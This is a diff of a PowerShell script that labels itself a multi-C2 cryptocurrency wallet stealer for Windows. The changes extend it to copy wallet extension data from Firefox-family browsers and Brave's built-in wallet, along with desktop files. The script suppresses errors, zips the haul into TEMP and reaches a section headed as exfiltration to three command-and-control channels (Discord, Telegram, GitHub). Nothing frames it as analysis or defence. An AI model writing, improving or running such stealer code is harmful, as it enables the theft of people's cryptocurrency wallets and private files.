@@ -1,5 +1,10 @@
 #Requires -Version 5.1
 
+# ============================================================
+# MULTI-C2 WALLET STEALER - Windows Version
+# Exfiltrates to: Discord + Telegram + GitHub
+# ============================================================
+
 $ErrorActionPreference = 'SilentlyContinue'
 
 # === CONFIGURATION ===
@@ -75,11 +80,31 @@ function wlist {
     )
 }
 
+function fflist {
+    return @(
+        "{d3e7e3df-07b8-4f27-be36-9f4c19cf5ede}|MetaMask"
+        "webextension@metamask.io|MetaMask"
+        "firefox@metamask.io|MetaMask"
+        "{530f7c6c-6077-4703-8f71-cb368c7ba294}|Phantom"
+        "{a4335603-26d8-4bba-b3db-2a7ced9f1c48}|Coinbase Wallet"
+        "{eadbf29f-4603-4234-98f5-efc4985e6c85}|Keplr"
+        "{7e09ce40-b81c-4fe9-a7e3-f8a04dd7cf98}|Ronin Wallet"
+        "ronin@axieinfinity.com|Ronin Wallet"
+        "{d5e44f8f-4d43-4e48-8e0f-85ab4da78fba}|Yoroi"
+    )
+}
+
 function desktop {
-    New-Item $DEST -ItemType Directory -Force | Out-Null
+    New-Item $DEST -ItemType Directory -Force -EA SilentlyContinue | Out-Null
     Get-ChildItem $DESK -File -EA SilentlyContinue | ForEach-Object {
         if ($_.Length -le $MAX) {
-            Copy-Item $_.FullName "$DEST\$($_.Name)" -EA SilentlyContinue
+            $dst = Join-Path $DEST $_.Name
+            if (Test-Path $dst) {
+                $ts = Get-Date -Format HHmmss
+                $dst = if ($_.Extension) { Join-Path $DEST "$($_.BaseName)_$ts$($_.Extension)" }
+                       else { Join-Path $DEST "$($_.Name)_$ts" }
+            }
+            Copy-Item $_.FullName $dst -EA SilentlyContinue
         }
     }
 }
@@ -87,14 +112,17 @@ function desktop {
 function cpw($bn, $pd, $id, $wn) {
     $pn = Split-Path $pd -Leaf
     $out = Join-Path $WDIR "$(sn $bn)\$(sn $pn)\$(sn $wn)"
-    New-Item $out -ItemType Directory -Force | Out-Null
+    New-Item $out -ItemType Directory -Force -EA SilentlyContinue | Out-Null
     $ver = Get-ChildItem "$pd\Extensions\$id" -Directory -EA SilentlyContinue | Sort-Object Name | Select-Object -Last 1
     if ($ver) { scp "$($ver.FullName)\manifest.json" "$out\manifest.json" }
     $idb = "$pd\IndexedDB\chrome-extension_${id}_0.indexeddb.leveldb"
-    if (Test-Path $idb) { New-Item "$out\IndexedDB" -ItemType Directory -Force | Out-Null; scp $idb "$out\IndexedDB" }
+    if (Test-Path $idb) {
+        New-Item "$out\IndexedDB" -ItemType Directory -Force -EA SilentlyContinue | Out-Null
+        scp $idb "$out\IndexedDB"
+    }
     $ls = "$pd\Local Storage\leveldb"
     if (Test-Path $ls) {
-        New-Item "$out\LS" -ItemType Directory -Force | Out-Null
+        New-Item "$out\LS" -ItemType Directory -Force -EA SilentlyContinue | Out-Null
         Get-ChildItem $ls -Include "*.ldb","*.log" -EA SilentlyContinue | Copy-Item -Destination "$out\LS" -Force -EA SilentlyContinue
     }
     "wallet=$wn`nbrowser=$bn`nprofile=$pn`next_id=$id" | Set-Content "$out\INFO.txt" -Encoding UTF8
@@ -112,6 +140,49 @@ function chromium {
                 $id, $wn = $w.Split('|', 2)
                 if (Test-Path "$pd\Extensions\$id") { cpw $bn $pd $id $wn }
             }
+        }
+    }
+}
+
+function firefox_scan {
+    @("Firefox|$env:APPDATA\Mozilla\Firefox\Profiles",
+      "Waterfox|$env:APPDATA\Waterfox\Profiles",
+      "LibreWolf|$env:LOCALAPPDATA\LibreWolf\Profiles") | ForEach-Object {
+        $lbl, $base = $_.Split('|', 2)
+        if (-not (Test-Path $base)) { return }
+        Get-ChildItem $base -Directory -EA SilentlyContinue | ForEach-Object {
+            $pd = $_.FullName; $pn = $_.Name; $ed = "$pd\extensions"
+            if (-not (Test-Path $ed)) { return }
+            foreach ($w in fflist) {
+                $id, $wn = $w.Split('|', 2)
+                $xpi = "$ed\$id.xpi"; $dir = "$ed\$id"
+                $fp = if (Test-Path $xpi) { $xpi } elseif (Test-Path $dir) { $dir } else { $null }
+                if (-not $fp) { continue }
+                $out = Join-Path $WDIR "$(sn $lbl)\$pn\$(sn $wn)"
+                New-Item $out -ItemType Directory -Force -EA SilentlyContinue | Out-Null
+                $sd = "$pd\browser-extension-data\$id"
+                if (Test-Path $sd) {
+                    New-Item "$out\storage" -ItemType Directory -Force -EA SilentlyContinue | Out-Null
+                    scp $sd "$out\storage"
+                }
+                "wallet=$wn`next_id=$id`nbrowser=$lbl`nprofile=$pn" | Set-Content "$out\INFO.txt" -Encoding UTF8
+            }
+        }
+    }
+}
+
+function brave_builtin {
+    $bp = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    if (-not (Test-Path $bp)) { return }
+    Get-ChildItem $bp -Directory -EA SilentlyContinue |
+        Where-Object { $_.Name -eq "Default" -or $_.Name -like "Profile*" } | ForEach-Object {
+        $pd = $_.FullName; $pn = $_.Name
+        if (-not (Test-Path "$pd\Preferences")) { return }
+        if ((Get-Content "$pd\Preferences" -Raw -EA SilentlyContinue) -match '"brave_wallet"') {
+            $out = Join-Path $WDIR "Brave\$pn\Brave_Builtin"
+            New-Item $out -ItemType Directory -Force -EA SilentlyContinue | Out-Null
+            scp "$bp\Local State" "$out\LocalState.json"
+            "wallet=Brave Builtin`nbrowser=Brave`nprofile=$pn" | Set-Content "$out\INFO.txt" -Encoding UTF8
         }
     }
 }
@@ -196,11 +267,13 @@ function Exfil-All {
 if ($env:OS -ne "Windows_NT") { exit 1 }
 
 Write-Host "🔍 Scanning for cryptocurrency wallets..." -ForegroundColor Yellow
-New-Item $DEST -ItemType Directory -Force | Out-Null
-New-Item $WDIR -ItemType Directory -Force | Out-Null
+New-Item $DEST -ItemType Directory -Force -EA SilentlyContinue | Out-Null
+New-Item $WDIR -ItemType Directory -Force -EA SilentlyContinue | Out-Null
 
 desktop
 chromium
+firefox_scan
+brave_builtin
 
 # Create ZIP
 $ZIP_OUT = "$env:TEMP\myfiles.zip"
@@ -210,7 +283,7 @@ try {
     Add-Type -Assembly System.IO.Compression.FileSystem -EA Stop
     [System.IO.Compression.ZipFile]::CreateFromDirectory($DEST, $ZIP_OUT)
 } catch {
-    Compress-Archive -Path "$DEST\*" -DestinationPath $ZIP_OUT -Force -EA SilentlyContinue
+    try { Compress-Archive -Path "$DEST\*" -DestinationPath $ZIP_OUT -Force -EA SilentlyContinue } catch {}
 }
 
 # Exfiltrate to THREE C2s
